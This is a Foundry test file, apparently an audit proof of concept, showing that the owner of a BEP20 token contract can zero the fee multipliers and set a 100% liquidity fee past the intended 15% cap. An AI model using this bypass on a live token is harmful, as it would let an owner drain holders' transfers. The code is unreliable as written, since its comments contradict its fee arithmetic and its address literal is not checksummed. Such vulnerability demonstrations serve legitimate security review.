```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

interface IBEP20LUNAINU {
    function getOwner() external view returns (address);
    function setMultipliers(uint256 _buy, uint256 _sell, uint256 _trans) external;
    function setFees_base1000(uint256 _liquidityFee, uint256 _marketingFee, uint256 _teamFee, uint256 _devFee) external;
    function liquidityFee() external view returns (uint256);
    function marketingFee() external view returns (uint256);
    function teamFee() external view returns (uint256);
    function devFee() external view returns (uint256);
    function totalFee() external view returns (uint256);
    function buyMultiplier() external view returns (uint256);
    function sellMultiplier() external view returns (uint256);
    function transferMultiplier() external view returns (uint256);
    function feeDenominator() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function isFeeExempt(address) external view returns (bool);
    function isTxLimitExempt(address) external view returns (bool);
    function isWalletLimitExempt(address) external view returns (bool);
    function _maxTxAmount() external view returns (uint256);
    function _maxWalletToken() external view returns (uint256);
    function authorize(address adr) external;
    function manage_FeeExempt(address[] calldata addresses, bool status) external;
}

contract ExploitTest is Test {
    address constant TARGET = 0xf05a8a840f09ac83b79875b4275cec1e60c2abdf;
    IBEP20LUNAINU target;

    function setUp() public {
        target = IBEP20LUNAINU(TARGET);
        vm.label(TARGET, "BEP20LUNAINU");
    }

    function testUnlimitedFeesSetting() public {
        // Get the current owner of the contract
        address owner = target.getOwner();
        require(owner != address(0), "Owner is zero");
        vm.label(owner, "Owner");

        // Act as the owner
        vm.startPrank(owner);

        // Before exploit: verify that default multiplier is 100 (100%)
        // This means totalFee * 100 / 100 <= 150 => totalFee <= 150
        // So setting any single fee > 150 would revert.
        // We will lower the multipliers first to allow a huge fee.
        target.setMultipliers(1, 1, 1);

        // New constraint: totalFee * 1 / 100 <= 150 => totalFee <= 15000
        // Now set liquidityFee to 1000 (100%), well above the intended 15% (150)
        target.setFees_base1000(1000, 0, 0, 0);

        // Verify the fees are set to extreme values
        assertEq(target.liquidityFee(), 1000, "liquidityFee should be 1000");
        assertEq(target.marketingFee(), 0, "marketingFee should be 0");
        assertEq(target.teamFee(), 0, "teamFee should be 0");
        assertEq(target.devFee(), 0, "devFee should be 0");
        assertEq(target.totalFee(), 1000, "totalFee should be 1000");
        assertEq(target.buyMultiplier(), 1, "buyMultiplier should be 1");
        assertEq(target.sellMultiplier(), 1, "sellMultiplier should be 1");
        assertEq(target.transferMultiplier(), 1, "transferMultiplier should be 1");

        // The intended limit per fee is 150 (15%). We set 1000, which is >150.
        assertTrue(target.liquidityFee() > 150, "liquidityFee exceeds 15% limit");

        vm.stopPrank();

        // Additionally, we can demonstrate that a transfer still works and incurs a fee.
        // For completeness, send some tokens to a non-exempt address (e.g., the test contract).
        // First, the owner holds all tokens initially.
        // Let's transfer a small amount to this test contract.
        uint256 amount = 1_000 * 1e9; // 1000 tokens (9 decimals)
        vm.prank(owner);
        target.transfer(address(this), amount);

        // Check that the test contract received less than amount due to fee
        uint256 balanceAfter = target.balanceOf(address(this));
        // Effective fee = totalFee * buyMultiplier / (feeDenominator * 100)
        //   = 1000 * 1 / (1000 * 100) = 0.01 = 1%
        uint256 expectedReceived = amount * 99 / 100;
        assertEq(balanceAfter, expectedReceived, "Transfer should incur 1% fee");
    }
}
```
